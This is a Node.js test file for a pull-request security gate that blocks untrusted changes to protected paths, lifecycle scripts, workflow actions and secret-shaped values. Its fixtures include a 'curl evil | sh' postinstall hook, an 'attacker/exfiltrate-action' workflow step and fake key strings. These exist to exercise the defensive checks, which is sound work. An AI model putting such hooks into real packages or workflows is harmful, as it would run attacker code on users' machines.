// Untrusted PR gate (#75): trust boundary, protected paths, allowed paths,
// content heuristics on patch text, config overrides, and the glob matcher.
import assert from 'node:assert/strict';
import { mkdirSync, mkdtempSync, writeFileSync } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { test } from 'node:test';

import {
  DEFAULT_GATE_CONFIG,
  evaluateUntrustedPr,
  globToRegExp,
  loadGateConfig,
  renderGateSummary,
} from '../src/security/untrusted-pr-gate.js';

const file = (filename, patch = '') => ({ filename, patch, status: 'modified' });

test('trusted contributors pass untouched, even on protected paths', () => {
  for (const association of ['OWNER', 'MEMBER', 'COLLABORATOR']) {
    const result = evaluateUntrustedPr({
      authorAssociation: association,
      files: [file('package.json', '+  "postinstall": "curl evil | sh",'), file('.github/workflows/ci.yml')],
    });
    assert.equal(result.trusted, true);
    assert.equal(result.verdict, 'allow');
    assert.deepEqual(result.findings, []);
  }
});

test('an untrusted docs-only PR is allowed', () => {
  const result = evaluateUntrustedPr({
    authorAssociation: 'NONE',
    files: [file('docs/guide.md', '+ better wording'), file('README.md', '+ badge'), file('tests/new.test.js', '+ test')],
  });
  assert.equal(result.trusted, false);
  assert.equal(result.verdict, 'allow');
  assert.deepEqual(result.findings, []);
});

test('an untrusted protected-path change blocks', () => {
  const result = evaluateUntrustedPr({
    authorAssociation: 'CONTRIBUTOR',
    files: [file('src/core/harness/guardrails.js', '+ // subtle change')],
  });
  assert.equal(result.verdict, 'block');
  assert.equal(result.findings[0].type, 'protected-path');
  assert.equal(result.findings[0].file, 'src/core/harness/guardrails.js');
});

test('package.json lifecycle-script mutation is named as its own finding', () => {
  const result = evaluateUntrustedPr({
    authorAssociation: 'FIRST_TIME_CONTRIBUTOR',
    files: [file('package.json', '@@\n+  "postinstall": "node ./collect.js",\n context')],
  });
  assert.equal(result.verdict, 'block');
  const types = result.findings.map((finding) => finding.type).sort();
  assert.deepEqual(types, ['package-lifecycle-script', 'protected-path']);
});

test('a new `uses:` in a workflow file is named as its own finding', () => {
  const result = evaluateUntrustedPr({
    authorAssociation: 'NONE',
    files: [file('.github/workflows/build.yml', '+      - uses: attacker/exfiltrate-action@v1')],
  });
  assert.ok(result.findings.some((finding) => finding.type === 'new-github-action-uses'));
  assert.equal(result.verdict, 'block');
});

// assembled at runtime so secret scanners (gitleaks in CI) never see a
// key-shaped literal in any commit
const FAKE_API_KEY_LINE = '+ api_key = "' + 'sk-live-' + 'abcdef0123456789' + '"';

test('secret-shaped additions block even on otherwise-allowed paths', () => {
  const cases = [
    FAKE_API_KEY_LINE,
    '+ aws_key: ' + 'AKIA' + 'A1B2C3D4'.repeat(2),
    '+ -----BEGIN RSA PRIVATE KEY-----',
  ];
  for (const line of cases) {
    const result = evaluateUntrustedPr({ authorAssociation: 'NONE', files: [file('docs/setup.md', line)] });
    assert.equal(result.verdict, 'block', `expected block for ${line}`);
    assert.equal(result.findings[0].type, 'secret-like-value');
  }
  // a mention of the word "token" in prose is not a secret
  const prose = evaluateUntrustedPr({ authorAssociation: 'NONE', files: [file('docs/setup.md', '+ set your token in .env')] });
  assert.equal(prose.verdict, 'allow');
});

test('unclassified paths fall back to needs-maintainer-review', () => {
  const result = evaluateUntrustedPr({
    authorAssociation: 'NONE',
    files: [file('src/observability/dashboard/ui/lib.js', '+ // ui tweak')],
  });
  assert.equal(result.verdict, 'needs-maintainer-review');
  assert.equal(result.findings[0].type, 'unclassified-path');
});

test('glob matcher: ** crosses directories, * does not, exact names stay exact', () => {
  assert.ok(globToRegExp('.github/**').test('.github/workflows/ci.yml'));
  assert.ok(globToRegExp('package.json').test('package.json'));
  assert.ok(!globToRegExp('package.json').test('sub/package.json'));
  assert.ok(globToRegExp('**/*.md').test('README.md'));
  assert.ok(globToRegExp('**/*.md').test('docs/deep/nested.md'));
  assert.ok(globToRegExp('docs/*').test('docs/a.md'));
  assert.ok(!globToRegExp('docs/*').test('docs/deep/a.md'));
  assert.ok(!globToRegExp('src/core/harness/**').test('src/core/harnessX/file.js'));
});

test('project config overrides merge over the strict defaults', () => {
  const projectRoot = mkdtempSync(path.join(os.tmpdir(), 'rstack-gate-'));
  mkdirSync(path.join(projectRoot, '.rstack', 'security'), { recursive: true });
  writeFileSync(path.join(projectRoot, '.rstack', 'security', 'untrusted-pr-gate.json'), JSON.stringify({
    allowed_untrusted_paths: ['docs/**', 'translations/**'],
    content_heuristics: { secret_like_values: 'allow' },
  }));
  const config = loadGateConfig(projectRoot);
  assert.deepEqual(config.allowed_untrusted_paths, ['docs/**', 'translations/**']);
  assert.equal(config.content_heuristics.secret_like_values, 'allow');
  assert.equal(config.content_heuristics.package_json_lifecycle_scripts, 'block'); // untouched default
  // and the override actually changes behavior
  const result = evaluateUntrustedPr({
    authorAssociation: 'NONE',
    files: [file('translations/de.md', FAKE_API_KEY_LINE)],
    config,
  });
  assert.equal(result.verdict, 'allow');
  // missing config file → defaults
  assert.deepEqual(loadGateConfig(mkdtempSync(path.join(os.tmpdir(), 'rstack-gate-'))), { ...DEFAULT_GATE_CONFIG });
});

test('summary renders the verdict and one row per finding', () => {
  const result = evaluateUntrustedPr({
    authorAssociation: 'NONE',
    files: [file('bin/rstack-agents.js', '+ hack')],
  });
  const summary = renderGateSummary(result);
  assert.match(summary, /Verdict: \*\*block\*\*/);
  assert.match(summary, /protected-path/);
  assert.match(summary, /`bin\/rstack-agents\.js`/);
  assert.match(summary, /untrusted — gate applied/);
});
